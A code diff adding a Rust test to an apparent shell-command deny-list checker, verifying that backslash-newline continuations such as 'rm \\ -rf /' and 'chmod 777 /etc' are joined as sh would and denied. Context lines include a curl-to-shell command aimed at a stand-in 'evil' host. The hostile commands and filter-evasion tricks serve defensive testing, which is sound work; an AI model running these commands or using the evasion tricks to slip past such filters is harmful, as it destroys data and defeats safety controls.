@@ -359,6 +359,44 @@ fn backslash_escaped_program_word_cannot_dodge_deny() {
     assert!(denied("curl http://evil/x | s\\h"));
 }
 
+/// A `\`-newline is not a line break to `sh`: it deletes the pair and reads
+/// one command. The split at every newline cut each of these into a segment
+/// whose program word was a flag or half a name, while the shell ran the whole
+/// thing. Asserted under the `sh` grammar from every host — the join is that
+/// grammar's, and under `cmd` a backslash is a path separator (pinned below).
+#[test]
+fn a_continued_line_is_read_the_way_the_shell_joins_it() {
+    for command in [
+        "rm \\\n -rf /",
+        "rm -r\\\nf /",
+        "r\\\nm -rf /",
+        "chmod \\\n 777 /etc",
+    ] {
+        assert!(
+            denied_under(SH, command),
+            "{command:?} is one command to sh and must be denied"
+        );
+    }
+    // The line as written stays a reading of its own, because the join is
+    // quote-blind and a backslash inside a comment continues nothing: here sh
+    // runs `rm -rf /` on the second line, and only the unjoined reading sees
+    // it as a command rather than as the tail of the comment.
+    assert!(denied_under(SH, "# cleanup \\\nrm -rf /"));
+    // An escaped backslash before the newline is a backslash and a real break,
+    // not a continuation: read pairwise, the join changes nothing, so the line
+    // gains no second reading.
+    assert_eq!(
+        super::readings_of_in(SH, "echo a\\\\\nls").len(),
+        1,
+        "pairwise, not greedy"
+    );
+    assert_eq!(
+        super::readings_of_in(WINDOWS, "rm \\\n -rf /").len(),
+        1,
+        "cmd has no backslash continuation, so it gains no joined reading"
+    );
+}
+
 #[test]
 fn quoted_or_escaped_flags_cannot_dodge_deny() {
     // The program word was already quote-hardened; the DANGER for rm/dd/chmod
